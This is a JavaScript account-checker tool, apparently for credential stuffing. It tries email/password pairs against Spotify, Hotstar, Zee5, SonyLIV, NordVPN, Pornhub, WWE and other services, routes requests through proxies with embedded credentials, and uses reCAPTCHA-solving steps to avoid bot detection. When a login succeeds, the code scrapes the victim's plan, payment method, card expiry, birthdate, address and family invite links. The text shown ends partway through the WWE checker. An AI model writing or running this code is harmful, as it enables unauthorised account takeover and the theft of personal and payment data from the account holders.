const axios = require('axios');
const cheerio = require('cheerio');
var qs = require('qs');
var FormData = require('form-data');

let spotifyChecker = async (account)=>{
    var checkResult = {
        validAccount: false,
        accountLogin: {
            email: account.login,
            password: account.password
        }
    };
    const httpsAgent = new HttpsProxyAgent( "AzYYbtGgo3UX64DyoZBXGMKf:QHu2RWpVyFNR6ioTcGuPQWv4@amsterdam.nl.socks.nordhold.net:443");
    const captchaToken = await axios.get(RecaptchaUrl,{
        proxy:{
            host:"uk1930.nordvpn.com",
            port: "1080",
            auth:{
                username:"AzYYbtGgo3UX64DyoZBXGMKf",
                password:"QHu2RWpVyFNR6ioTcGuPQWv4"
            }
        }
    }).then(res=>{
        const $ =  cheerio.load(res.data);
        console.log($('#recaptcha-token').attr('value'));
        return $('#recaptcha-token').attr('value');
    });
    var data = new FormData();
    data.append('v', 'iSHzt4kCrNgSxGUYDFqaZAL9');
    data.append('vh', '13599012192');
    data.append('size', 'invisible');
    data.append('reason', 'q');
    data.append('k', '6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39');
    data.append('hl', 'en');
    data.append('co', 'aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.');
    data.append('chr', '%5B89%2C64%2C27%5D');
    data.append('bg', '!q62grYxHRvVxjUIjSFNd0mlvrZ-iCgIHAAAB6FcAAAANnAkBySdqTJGFRK7SirleWAwPVhv9-XwP8ugGSTJJgQ46-0IMBKN8HUnfPqm4sCefwxOOEURND35prc9DJYG0pbmg_jD18qC0c-lQzuPsOtUhHTtfv3--SVCcRvJWZ0V3cia65HGfUys0e1K-IZoArlxM9qZfUMXJKAFuWqZiBn-Qi8VnDqI2rRnAQcIB8Wra6xWzmFbRR2NZqF7lDPKZ0_SZBEc99_49j07ISW4X65sMHL139EARIOipdsj5js5JyM19a2TCZJtAu4XL1h0ZLfomM8KDHkcl_b0L-jW9cvAe2K2uQXKRPzruAvtjdhMdODzVWU5VawKhpmi2NCKAiCRUlJW5lToYkR_X-07AqFLY6qi4ZbJ_sSrD7fCNNYFKmLfAaxPwPmp5Dgei7KKvEQmeUEZwTQAS1p2gaBmt6SCOgId3QBfF_robIkJMcXFzj7R0G-s8rwGUSc8EQzT_DCe9SZsJyobu3Ps0-YK-W3MPWk6a69o618zPSIIQtSCor9w_oUYTLiptaBAEY03NWINhc1mmiYu2Yz5apkW_KbAp3HD3G0bhzcCIYZOGZxyJ44HdGsCJ-7ZFTcEAUST-aLbS-YN1AyuC7ClFO86CMICVDg6aIDyCJyIcaJXiN-bN5xQD_NixaXatJy9Mx1XEnU4Q7E_KISDJfKUhDktK5LMqBJa-x1EIOcY99E-eyry7crf3-Hax3Uj-e-euzRwLxn2VB1Uki8nqJQVYUgcjlVXQhj1X7tx4jzUb0yB1TPU9uMBtZLRvMCRKvFdnn77HgYs5bwOo2mRECiFButgigKXaaJup6NM4KRUevhaDtnD6aJ8ZWQZTXz_OJ74a_OvPK9eD1_5pTG2tUyYNSyz-alhvHdMt5_MAdI3op4ZmcvBQBV9VC2JLjphDuTW8eW_nuK9hN17zin6vjEL8YIm_MekB_dIUK3T1Nbyqmyzigy-Lg8tRL6jSinzdwOTc9hS5SCsPjMeiblc65aJC8AKmA5i80f-6Eg4BT305UeXKI3QwhI3ZJyyQAJTata41FoOXl3EF9Pyy8diYFK2G-CS8lxEpV7jcRYduz4tEPeCpBxU4O_KtM2iv4STkwO4Z_-c-fMLlYu9H7jiFnk6Yh8XlPE__3q0FHIBFf15zVSZ3qroshYiHBMxM5BVQBOExbjoEdYKx4-m9c23K3suA2sCkxHytptG-6yhHJR3EyWwSRTY7OpX_yvhbFri0vgchw7U6ujyoXeCXS9N4oOoGYpS5OyFyRPLxJH7yjXOG2Play5HJ91LL6J6qg1iY8MIq9XQtiVZHadVpZVlz3iKcX4vXcQ3rv_qQwhntObGXPAGJWEel5OiJ1App7mWy961q3mPg9aDEp9VLKU5yDDw1xf6tOFMwg2Q-PNDaKXAyP_FOkxOjnu8dPhuKGut6cJr449BKDwbnA9BOomcVSztEzHGU6HPXXyNdZbfA6D12f5lWxX2B_pobw3a1gFLnO6mWaNRuK1zfzZcfGTYMATf6d7sj9RcKNS230XPHWGaMlLmNxsgXkEN7a9PwsSVwcKdHg_HU4vYdRX6vkEauOIwVPs4dS7yZXmtvbDaX1zOU4ZYWg0T42sT3nIIl9M2EeFS5Rqms_YzNp8J-YtRz1h5RhtTTNcA5jX4N-xDEVx-vD36bZVzfoMSL2k85PKv7pQGLH-0a3DsR0pePCTBWNORK0g_RZCU_H898-nT1syGzNKWGoPCstWPRvpL9cnHRPM1ZKemRn0nPVm9Bgo0ksuUijgXc5yyrf5K49UU2J5JgFYpSp7aMGOUb1ibrj2sr-D63d61DtzFJ2mwrLm_KHBiN_ECpVhDsRvHe5iOx_APHtImevOUxghtkj-8RJruPgkTVaML2MEDOdL_UYaldeo-5ckZo3VHss7IpLArGOMTEd0bSH8tA8CL8RLQQeSokOMZ79Haxj8yE0EAVZ-k9-O72mmu5I0wH5IPgapNvExeX6O1l3mC4MqLhKPdOZOnTiEBlSrV4ZDH_9fhLUahe5ocZXvXqrud9QGNeTpZsSPeIYubeOC0sOsuqk10sWB7NP-lhifWeDob-IK1JWcgFTytVc99RkZTjUcdG9t8prPlKAagZIsDr1TiX3dy8sXKZ7d9EXQF5P_rHJ8xvmUtCWqbc3V5jL-qe8ANypwHsuva75Q6dtqoBR8vCE5xWgfwB0GzR3Xi_l7KDTsYAQIrDZVyY1UxdzWBwJCrvDrtrNsnt0S7BhBJ4ATCrW5VFPqXyXRiLxHCIv9zgo-NdBZQ4hEXXxMtbem3KgYUB1Rals1bbi8X8MsmselnHfY5LdOseyXWIR2QcrANSAypQUAhwVpsModw7HMdXgV9Uc-HwCMWafOChhBr88tOowqVHttPtwYorYrzriXNRt9LkigESMy1bEDx79CJguitwjQ9IyIEu8quEQb_-7AEXrfDzl_FKgASnnZLrAfZMtgyyddIhBpgAvgR_c8a8Nuro-RGV0aNuunVg8NjL8binz9kgmZvOS38QaP5anf2vgzJ9wC0ZKDg2Ad77dPjBCiCRtVe_dqm7FDA_cS97DkAwVfFawgce1wfWqsrjZvu4k6x3PAUH1UNzQUxVgOGUbqJsaFs3GZIMiI8O6-tZktz8i8oqpr0RjkfUhw_I2szHF3LM20_bFwhtINwg0rZxRTrg4il-_q7jDnVOTqQ7fdgHgiJHZw_OOB7JWoRW6ZlJmx3La8oV93fl1wMGNrpojSR0b6pc8SThsKCUgoY6zajWWa3CesX1ZLUtE7Pfk9eDey3stIWf2acKolZ9fU-gspeACUCN20EhGT-HvBtNBGr_xWk1zVJBgNG29olXCpF26eXNKNCCovsILNDgH06vulDUG_vR5RrGe5LsXksIoTMYsCUitLz4HEehUOd9mWCmLCl00eGRCkwr9EB557lyr7mBK2KPgJkXhNmmPSbDy6hPaQ057zfAd5s_43UBCMtI-aAs5NN4TXHd6IlLwynwc1zsYOQ6z_HARlcMpCV9ac-8eOKsaepgjOAX4YHfg3NekrxA2ynrvwk9U-gCtpxMJ4f1cVx3jExNlIX5LxE46FYIhQ');
    data.append('c', captchaToken);
    var configRes = {
        method: 'post',
        url: 'https://www.google.com/recaptcha/api2/reload?k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39',
        headers: {
            'Cookie': 'NID=204=GtnsbLOrRlTN_GWJfFAZwLY7lmbdV1t5FIvYbe03bv7t0ovJrXAg617GqhDnyW36fN5zam8SEk-YNsPmLWOfURR59J4unSaZCdp2du5EiAJIAt48ICgoP7IJqNtXXfLGVyoxvOD89HoPvBNxuZUCLayrh2ajIhDtIDJGqCb2MMw',
            ...data.getHeaders()
        },
        data : data
    };
    const cookies = await axios.get("https://accounts.spotify.com/id-ID/login").then(axiosResponse => axiosResponse.headers["set-cookie"]);
    const ress = await axios(configRes)
        .then(axiosResponse=>{
            return axiosResponse.data.split('rresp')[1].split(',null')[0].replace('\"','').replace(',','').replace(/\"/g,"");
        })
        .catch(err => console.log(err));

    var dataLogin = qs.stringify({
        'username': account.login,
        'password': account.password,
        'remember': 'false',
        'csrf_token': cookies[2].split(";")[0].replace("csrf_token=",''),
        'recaptchaToken':ress
    });
    var configLogin = {
        method: 'post',
        url: 'https://accounts.spotify.com/login/password',
        headers: {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9,fa;q=0.8',
            'Origin': 'https://accounts.spotify.com',
            'Referer': 'https://accounts.spotify.com/en/login/?continue=https:%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&_locale=en-AE',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': 'sp_ab=%7B%222019_04_premium_menu%22%3A%22control%22%7D; spot=%7B%22t%22%3A1605136046%2C%22m%22%3A%22fr%22%2C%22p%22%3Anull%7D; sp_t=e262c788-69d5-4bcb-9d8d-f377ebb693f7; sp_new=1; justRegistered=null; __tdev=QHMTxssj; __tvis=qx4MC7SP; _gat=1; remember=accce@aol.com; '+cookies[0].split(";")[0].replace("",'')+';'+cookies[1].split(";")[0].replace("",'')+'; __bon=MHwwfC0zNDkzNzM1NDN8LTE0NjczNjg4ODA2fDF8MXwxfDE=; sp_ac=AQDEi4nePTwXpURm2eD6s161CJFK-rIddW-AqmkUAaptluHcSHcsA-T_SVGlKJ2291EdYM_dxF4iXUqf06Es4wVyb_ytxivQLjGca9dWaHjiAtGDngSNe0EKDFDxTVubiuqcMU9soUyVuYqHNSvMtIIltKUnLAVzhAVoXFL4HRhYVxtKr6sKyJsBgFJdEn3LQ3VSKTu8_ck9ylp6EY-HcMXKQ58IjygSsAI; sp_dc=AQArKogjDcGCIdeHBArxmqHFB2wTdyy2nVaKTdV5VWLEGzVn7mq1lYWjw0VdPnPnCrHpRPauTUlwFNVH26HmbfHoBOSBMGutt5DmRArRNg; csrf_token='+cookies[2].split(";")[0].replace("csrf_token=",'')+'; sp_key=4f4420ef-b662-4bc8-aad7-214ac52839c1'
        },
        data : dataLogin
    };
    return await axios(configLogin)
        .then(async function (response) {
            var loginCookie= response.headers["set-cookie"];
            var configOverview = {
                method: 'get',
                withCredentials: true,
                url: 'https://www.spotify.com/us/api/account/overview/',
                headers: {
                    // 'Cookie': 'sp_ab=%7B%222019_04_premium_menu%22%3A%22control%22%7D; sp_t=e262c788-69d5-4bcb-9d8d-f377ebb693f7; sp_dc=AQArKogjDcGCIdeHBArxmqHFB2wTdyy2nVaKTdV5VWLEGzVn7mq1lYWjw0VdPnPnCrHpRPauTUlwFNVH26HmbfHoBOSBMGutt5DmRArRNg; sp_key=4f4420ef-b662-4bc8-aad7-214ac52839c1; spsess=es20S-Lcyzzn%2CxY503kecHU4XmzRGLGTyXvwOm1mTyiuimK6; sp_usid=85b0ddbf-df13-480c-b19c-19f1ea186b53; sp_phash=42910c21d48dd656a97d17d1da9bc62426e4d49e; sp_gaid=0088fc4fc9b22f66826dd99fc8ba9afac867440b814d4497c78376; sp_m=us; spot=%7B%22t%22%3A1605136046%2C%22m%22%3A%22us%22%2C%22p%22%3Anull%7D; wceuc=ATCDyz8gPnQsfr8sZjjA0Dlf8AyIkbLzGnPlsCysn1U6cey2s0hr996vd6mzYhMoplp/VIjWp5BD3nMFjfn8QzucbVv1nJj7o9w+LUBLX/myMgPk2CqXUJFZ/YHmr3JAvBsyWsaPK6w8BwdC4Gq56mRS6y6V1D6ck67bf++qrqgbnHlX2Vtc/kSrgp6fw0wAYJb4m3kXHKrfOBNdTrUubAmoKB1A52SbcCzhI3MH9BYFtIPitco0njv15vVBNQNHbuofztd2+Zk7uOemAXGG5eRjAVL+Ps/QmKodOHGXMqwLRi+rvn1vuSK6ifj0WzkCp16E11acT7881ZEREtkTJ7VPuI60QpO/2NL+sGzxZtWdh4xEapab5gOhhIKoqb2ok8Zf0CXS09JN9HjgBbEblCqs6FF++fyX+uSCAzBl2PlNjQATpFN+48KYUHetSnsdzwzBbckL; sp_landing=https%3A%2F%2Fwww.spotify.com%2Fus%2Fapi%2Faccount%2Foverview%2F'
                    'Cookie' :loginCookie.map(e => e.split(';')[0]).join(';')
                }
            };
            const innerText = await axios(configOverview)
                .then(function (response) {
                    return response.data;
                })
                .catch(function (error) {
                    console.log(error);
                });
            configOverview.url = "https://www.spotify.com/us/api/account/datalayer/";
            const datalayer = await axios(configOverview)
                .then(function (response) {
                    return response.data;
                })
                .catch(function (error) {
                    console.log(error);
                });
            configOverview.url = "https://www.spotify.com/us/home-hub/api/v1/family/home/";
            const memberArea = await axios(configOverview)
                .then(function (response) {
                    return response.data;
                })
                .catch(function (error) {
                    return { code: 'NOT_FOUND', detail: 'Home not found.' }
                });
            configOverview.url = "https://www.spotify.com/api/account-settings/v1/profile/";
            const theProfile =  await axios(configOverview)
                .then(function (response) {
                    return response.data;
                })
                .catch(function (error) {
                    // console.log(error);
                    return {profile:{username:null,gender:null,birthdate:null,third_party_email:null}}
                });


            checkResult.validAccount = true;
            checkResult.accountInfo = {
                plan: innerText.props.plan.plan.name,
                username: theProfile.profile.username ,
                gender: theProfile.profile.gender,
                birthdate: theProfile.profile.birthdate,
                third_party_email: theProfile.profile.third_party_email,
                country: innerText.props.profile.fields[innerText.props.profile.fields.length - 1].value,
                accountDayAge: datalayer.accountAgeDays,
                isTrialUser: datalayer.isTrialUser,
                paymentInfo: null,
                members: null
            };
            if (datalayer.isSubAccount || datalayer.currentPlan === "free") {
                checkResult.accountInfo.paymentInfo = null;
                if (datalayer.isSubAccount)
                    checkResult.accountInfo.plan += ' | member';
            } else if (!datalayer.isSubAccount || !datalayer.isTrialUser) {
                checkResult.accountInfo.plan += ' | owner';
                console.log("overline === "+innerText.props.plan.plan.overline);
                if(!innerText.props.plan.plan.overline){
                    if(innerText.props.plan.paymentInfo.billingInfo && !innerText.props.plan.paymentInfo.note){
                        checkResult.accountInfo.paymentInfo = {
                            price: innerText.props.plan.paymentInfo.billingInfo.split(">")[1].split("<")[0],
                            nextBill: innerText.props.plan.paymentInfo.billingInfo.split(">")[3].split("<")[0],
                            expires: innerText.props.plan.paymentInfo.paymentMethod.expiry,
                            paymentMethod: innerText.props.plan.paymentInfo.paymentMethod.name
                        }
                    }else{
                        checkResult.accountInfo.paymentInfo = {
                            price: null,
                            nextBill: innerText.props.plan.paymentInfo.note.split('>')[1].replace('</b',''),
                            expires: null,
                            paymentMethod: null
                        }
                    }
                }else{
                    console.log("note"+innerText.props.plan.paymentInfo.note);
                    var note = innerText.props.plan.paymentInfo.note;
                    if(!note)
                        note = innerText.props.plan.paymentInfo.billingInfo;
                    checkResult.accountInfo.paymentInfo = {
                        price: null,
                        nextBill: note.split('>')[1].replace('</b',""),
                        expires: null,
                        paymentMethod: null
                    };
                    checkResult.accountInfo.plan += " | " + innerText.props.plan.plan.overline
                }

            }
            if (memberArea.planType === "family" && memberArea.code !== "NOT_FOUND") {
                checkResult.accountInfo.members = [];
                if (memberArea.inviteToken) {
                    checkResult.accountInfo.inviteToken = "https://www.spotify.com/us/family/join/invite/" + memberArea.inviteToken;
                    checkResult.accountInfo.address = memberArea.address;
                    checkResult.accountInfo.maxCapacity = memberArea.maxCapacity;
                }
                var members = memberArea.members;
                for (var i = 0; i < members.length; i++) {
                    checkResult.accountInfo.members.push({
                        name: members[i].name,
                        isChildAccount: members[i].isChildAccount
                    })
                }
            }
            return checkResult;
        })
        .catch(function (error) {
            return checkResult;
        });

};

let hotstarChecker = async (account,page)=>{
    if(!!account.login && validateEmail(account.login)){
        await page.goto("https://www.hotstar.com/in");
        await page.waitFor(5000);
        await page.evaluate(() => document.getElementsByClassName('signIn')[0].click());
        await page.waitFor(1000);
        await page.evaluate(() => document.getElementsByClassName('email-or-fb-signin')[0].click());
        await page.type('#emailID', account.login,{delay:100});
        await page.evaluate(()=> document.getElementsByClassName('submit-button')[0].click());
        await page.waitFor(2000);
       const otp = await page.evaluate(()=>{
            try {
               return !!document.getElementsByClassName('resend-code')[0]
            }
            catch {err} {
                return false;
            }
        });
       console.log(otp);
        var checkResult = {
            validAccount:true,
            otp:otp,
            accountLogin:{
                email:account.login,
                password:account.password
            },
            accountInfo:null
        };
       if(!otp){
           await page.type('#password', account.password,{delay:100});
           await page.waitFor(500);
           await page.evaluate(()=>document.getElementsByClassName('submit-button')[0].click());
           await page.waitFor(5000);
           const connected = await page.evaluate(()=> !document.getElementById('password'));
           checkResult.validAccount = connected;
           if(connected){
               await page.goto('https://www.hotstar.com/in/subscribe/my-account');
               await  page.waitFor(5000);
               checkResult.accountInfo =  await page.evaluate(()=>{
                   document.getElementsByClassName('billing-transactions-header')[0].click();
                   var paymentMethod= document.getElementsByClassName('card-name')[0] || {textContent:null};
                   var info = {
                       plan: document.getElementsByClassName('membership-title')[0].textContent,
                       nextBill:document.getElementsByClassName('membership-desc')[0].textContent,
                       paymentMethod:document.getElementsByClassName('mode')[0].textContent,
                       period:document.getElementsByClassName('peroid')[0].textContent,
                       amount:document.getElementsByClassName('amount')[0].textContent
                   };
                   document.getElementsByClassName('sign-out-link')[0].click();
                   return info;
               });
           }
       }
        return checkResult;
    }else {
        throw "enter valid cridential";
    }

};

let zee5Checker = async (account, page) => {
    if (validateEmail(account.login) && !!account.password) {
        await page.goto('https://userapi.zee5.com/v1/user/loginemail?email=' + account.login + '&password=' + account.password);
        var innerText = await page.evaluate(() => {
            return JSON.parse(document.querySelector("body").innerText);
        });
        var checkResult = {
            validAccount: false,
            accountLogin: {
                email: account.login,
                password: account.password
            }
        };
        if (innerText.token) {
            console.log(true);
            checkResult.validAccount = true;
            const scraped = await page.evaluate(() => {
                const myHeaders = new Headers();
                myHeaders.append('X-Z5-Appversion', '17.0.0.6');
                myHeaders.append('X-Z5-AppPlatform', 'Android Mobile');
                myHeaders.append('Host', 'userapi.zee5.com');
                myHeaders.append('Connection', 'Keep-Alive');
                myHeaders.append('Accept-Encoding', 'gzip');
                myHeaders.append('Authorization', 'bearer ' + JSON.parse(document.querySelector("body").innerText).token);
                return fetch('https://subscriptionapi.zee5.com/v1/subscription?translation=en&include_active=true', {
                    method: 'GET',
                    headers: myHeaders,
                })
                    .then(response => response.json())
                    .then(json => json[0]);
            });

            checkResult.accountInfo = {
                planType: scraped.subscription_plan.subscription_plan_type,
                planTitle: scraped.subscription_plan.title,
                state: scraped.state,
                freeTrial: scraped.free_trial,
                start: scraped.subscription_start,
                end: scraped.subscription_end,
                country: scraped.subscription_plan.country,
                numSup: scraped.subscription_plan.number_of_supported_devices,
                billingCycle: scraped.subscription_plan.billing_frequency,
                billingCycleType: scraped.subscription_plan.billing_cycle_type,
                valid_for_all_countries: scraped.subscription_plan.valid_for_all_countries,
                countries: scraped.subscription_plan.countries,
                price: scraped.subscription_plan.price + scraped.subscription_plan.currency
            };
            return checkResult;
        }
    }

};

let altbalajiChecker = async (account)=>{
    var checkResult = {
        validAccount:false,
        accountLogin:{
            email:account.login,
            password:account.password
        },
        accountInfo:null
    };
    if(validateEmail(account.login)){
        try {
            var myHeaders = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8,ar;q=0.7,de;q=0.6',
                'Connection': 'Keep-Alive',
                'Content-Length': '63',
                'Host': 'api.cloud.altbalaji.com',
                'Sec-Fetch-Dest': 'empty'
            };
            const token = await axios.post("https://api.cloud.altbalaji.com/accounts/login?domain=IN",
                {username: account.login, password: account.password},
                {headers:myHeaders}
            ).then(axiosResponse => axiosResponse.data);
            console.log(token);
            const profile = await axios.get('https://api.cloud.altbalaji.com/accounts?Account_Id=4266539&Profile_Id=4266540&domain=IN',{
                headers:{'XSSESSION':token.session_token}
            })
                .then(axiosResponse => axiosResponse.data);
            console.log(profile);
            const payment = await axios.get('https://payment.cloud.altbalaji.com/accounts/orders?domain=IN&limit=50',{
                headers:{'XSSESSION':token.session_token}
            }).then(axiosResponse => axiosResponse.data);

            checkResult.validAccount = true;
            checkResult.accountInfo = {
                surname: profile.surname,
                name: profile.name,
                type: profile.type,
                gender: profile.details.gender,
                state: profile.details.state,
                email_verified: profile.email_verified,
                paymentInfo: {
                    payment_type: payment.orders[0].payment_type,
                    amount: payment.orders[0].price.amount + payment.orders[0].price.amount.currency,
                    is_free: payment.orders[0].price.is_free,
                    start: payment.orders[0].dates.valid_from,
                    end: payment.orders[0].dates.valid_to,
                    status: payment.orders[0].status,
                    is_trial: payment.orders[0].is_trial,
                    payment_method: payment.orders[0].payment_method
                }
            };
            console.log(checkResult);

        }
        catch (e) {
            console.log(e);
            return checkResult;
        }
    }
};

let vootChecker = async (account) => {
    var checkResult = {
        validAccount:false,
        accountLogin: {
            email: account.login,
            password:account.password
        },
        accountInfo:null
    };

    if(validateEmail(account.login)){
        try {
            const token = await axios.post('https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/login',{
                "type": "traditional",
                "deviceId": "Windows NT 10.0",
                "deviceBrand": "PC/MAC",
                "data": {"email": account.login, "password": account.password}
            },{ headers: {'content-type': 'application/json'}})
                .then(axiosResponse => axiosResponse.data.data);
            console.log(token);
            checkResult.validAccount = true;
            checkResult.accountInfo = await axios.get("https://pxapi.voot.com/smsv4/int/ps/v1/voot/transaction/list",{
                headers: {
                    'content-type': 'application/json',
                    'accesstoken': token.authToken.accessToken
                }
            }).then(res=>{
                var payment = res.data;
                return {
                    age: token.age,
                    mobile: token.mobile,
                    languages: token.languages,
                    birthDate: token.birthDate,
                    firstName: token.firstName,
                    profileName: token.profileName,
                    lastName: token.lastName,
                    gender: token.gender,
                    isTemporaryPassword: token.isTemporaryPassword,
                    isPasswordChangeable: token.isPasswordChangeable,
                    paymentInfo: {
                        start: payment.results.list[0].startDate.gmtDate,
                        end: payment.results.list[0].endDate.gmtDate,
                        duration: payment.results.list[0].itemDetails.duration,
                        plan: payment.results.list[0].itemDetails.name,
                        isRenewable: payment.results.list[0].itemDetails.isRenewable,
                        price: payment.results.list[0].price.amount + payment.results.list[0].price.currency,
                        paymentMethod: payment.results.list[0].paymentDetails.extras.mode,
                        PaymentGateway: payment.results.list[0].paymentDetails.extras.PaymentGateway
                    }
                }
            });
            console.log(checkResult);
            return checkResult
        }
        catch (e) {
            console.log(e);
            return checkResult;
        }
    }
};

let sonylivChecker = async (account,page) => {
  await page.goto('https://api.sonyliv.com');
  const scraped = await page.evaluate((account)=>{
     return fetch('https://api.sonyliv.com/api/v4/auth/login', {
          method: 'POST',
          headers:  {
              'content-type': 'application/json',
              'User-Agent':'User-Agent: Dalvik/2.1.0 (Linux; U; Android 8.0.0; SSL Build/OPR6.170623.017)',
              "Host": "api.sonyliv.com",
              "x-via-device": "true"
          },
          body:JSON.stringify({"appClientId":" ",
              "contactPassword":account.password,
              "channelPartnerID":"MSMIND",
              "deviceType":"Android Phone",
              "advertisingId":"",
              "timestamp":"2020-10-26T10:33:29+0530",
              "serialNo":"",
              "contactUserName":account.login,
              "deviceName":"Google",
              "modelNo":"google Pixel 2",
              "gaUserId":" "})
      })
          .then(response  => response.json())
         .then(token => {
             return fetch('https://api.sonyliv.com/api/v1/subscription/getAllSubscriptions', {
                 method: 'POST',
                 headers:  {
                     'content-type': 'application/json',
                     'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SSL Build/OPR6.170623.017)',
                     "Host": "api.sonyliv.com",
                     "x-via-device": "true",
                     "Authorization":"Bearer "+ token.accessToken
                 },
                 body:JSON.stringify({"appClientId":"",
                     "channelPartnerID":"MSMIND",
                     "timestamp":"2020-10-26T10:33:29+0530",
                     "languageCode":"en_US",
                     "deviceName":"Google",
                     "modelNo":"google Pixel 2",
                 })
             })
                 .then(response  => response.json())
                 .then(subscription =>{
                     return subscription;
                 })
         })
  },account);
  console.log(scraped);
  return scraped;
};

let jiosaavnChecker = async (account)=>{
    var checkResult = {
        validAccount: false,
        accountLogin: {email: account.login, password: account.password},
        accountInfo: null
    };
    try{
        let data = new FormData();
        data.append('username', account.login);
        data.append('password', account.password);
        var config = {
            method: 'post',
            url: 'https://www.jiosaavn.com/api.php?__call=user.login&api_version=4&_format=json&_marker=0&ctx=web6dot0',
            headers: {
                'Cookie': 'geo=163.172.121.143%2CFR%2C%2C%2C; B=aec522844f8a6de7e0990e8c14760940; CT=MTM3NDM5MjY5; CH=G03%2CA07%2CO00%2CL03; P=pro%3A1614014900; TID=ZnVsbHByb190aWVy%3A1614014900; I=PSpQ2VWE%2BFqn2p%2FOxxuT%2FdIwFRUmEgjb0%2B4OfA5XfgciGxtz4HzvNkh7s0XL2KeOeEYTJXEKnspRsw5PlvInGLARc9j7OVLfoxPCOu6WeuxrwqS0OM%2FR4nr0PgMBY2bHnawgIFKYs2Ue%2BxNJMp2jG%2Fbcp3Y5eTuhfYEr2hyAc90Yjd3WPx99QY5nVJZ8b%2BXHsPHix7Uyln0p141Xrezk0SUdYJxkcbOMS03zU9a0KLN0RrF8kUwngYznBSco3pWRfwczBIcuNK4Xu9%2Fyi8UrAKaQh383aTqGp8gyfezVCll0iy7ycVwNLlu7Qs6nX3Sj9nuv80tVpnOFxwWw6lnuvaWr7I96e4TysVYP9PZdtFGh2m8HKuGlxw%3D%3D; SG=f',
                ...data.getHeaders()
            },
            data : data
        };

        const scraped = await axios(config)
            .then(function (response) {
                return response.data;
            })
            .catch(function (error) {
                console.log(error);
            });

        console.log(scraped);
        checkResult.validAccount = true;
        checkResult.accountInfo = scraped;
    }catch (e) {
        console.log(e);
    }
    return  checkResult;
};

let nordvpnChecker = async (account,page) => {
   await page.goto('https://my.nordaccount.com/api/v1/users/tokens');
   var checkResult = {
       validAccount : false,
       accountInfo:null
   };
   const RequestToken = await page.evaluate((account)=>{
       return fetch('https://my.nordaccount.com/api/v1/users/tokens',{
           method:'POST',
           headers:{
               'Content-Type': "application/json" ,
               "Host": "api.nordvpn.com" ,
               "Connection": "keep-alive" ,
               "Accept": "application/json",
               "DNT2": 1 ,
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36" ,
               "Accept-Language":"en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7" ,
               "Accept-Encoding": "gzip, deflate",
           },
           body:JSON.stringify({
               username:account.login,
               password:account.password
           })

       }).then(res => res.json())
   },account);
    console.log(RequestToken.token);
   await page.goto('https://my.nordaccount.com/api/v1/users/services');
   const scraped = await page.evaluate((token)=>{
      return fetch('https://my.nordaccount.com/api/v1/users/services',{
                   method:'GET',
                   headers:{
                       "DNT": 1 ,
                       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36" ,
                       "x-csrf-token": token,
                       "Authorization":token,
                       "Connection": "keep-alive",
                       "Accept": "*/*",
                       "Sec-Fetch-Site": "none" ,
                       "Sec-Fetch-Mode": "cors" ,
                       "Sec-Fetch-Dest": "" ,
                       "Accept-Encoding": "gzip, deflate"
                   }
           }).then(res => res.json())
             .then(sub => sub);
   },RequestToken.token);

   console.log(scraped);
   return checkResult;
};

let pornhubChecker = async (account,page) => {
    var checkResult = {
        validAccount : false,
        accountLogin:{
            email:account.login,
            password:account.password
        },
        accountInfo : null
    };
   await page.goto('https://www.pornhub.com/login');
   await page.waitFor(2000);
   const  scraped = await page.evaluate((account)=>{
       // var xhr1 = new XMLHttpRequest();
       // xhr1.open('POST', 'https://www.pornhub.com/front/authenticate');
       let data = new FormData();
       data.append('username', account.login);
       data.append('password', account.password);
       data.append('token', document.querySelector('input[name="token"]').value);
       data.append('from', 'pc_login_modal_:index');
       data.append('subscribe', '');
       data.append('setSendTip', false);
       // data.append('redirect', 'ENN9pwzDTaC6NvmWvmszV2KQVUSBedlTB5BMBe0jDfU');
       // xhr1.setRequestHeader('Pragma', 'no-cache');
       // xhr1.setRequestHeader('Accept','application/json, text/javascript, */*; q=0.01');
       // xhr1.send(data);
       return fetch('https://www.pornhub.com/front/authenticate',{
           method:'POST',
           headers:{
               'Pragma':'no-cache',
               'Accept':'application/json, text/javascript, */*; q=0.01'
           },
           body : data
       }).then(res => res.json()).then(acc => acc);
   },account);
   if(parseInt(scraped.success) || scraped.user_exists){
       checkResult.accountInfo = scraped;
       checkResult.validAccount = true;
   }
   console.log(scraped);
   return checkResult;
};

let wweChecker = async (account) => {
    var checkResult = {
        validAccount: false,
        accountLogin : {
            email:account.login,
            password : account.password
        },
        accountInfo:{}
    };
        var data = JSON.stringify({"id":account.login,"secret":account.password});
        var config = {
            method: 'post',
            url: 'https://dce-frontoffice.imggaming.com/api/v2/login',
            headers: {
                'realm': 'dce.wwe',
                'app': 'dice',
                'if-none-match': '',
                'x-api-key': 'ef59c096-d95d-428e-ad94-86385070dde2',
                'Content-Type': 'application/json'
            },
            data : data
        };

       const tokenObj = await axios(config)
            .then(async function (response) {
                var configLicences = {
                    method: 'get',
                    url: 'https://dce-frontoffice.imggaming.com/api/v2/user/licence',
                    headers: {
                        'Authorization': 'Bearer ' + response.data.authorisationToken,
                        'realm': 'dce.wwe',
                        "accept": "*/*",
                        "accept-encoding": "gzip;q=1.0, compress;q=0.5",
                        "app": "dice",
                        "if-none-match": "",
                        "accept-language": "en-US;q=1.0",
                        'x-api-key': 'ef59c096-d95d-428e-ad94-86385070dde2'
                    }
                };
                var configProfile = {
                    method: 'get',
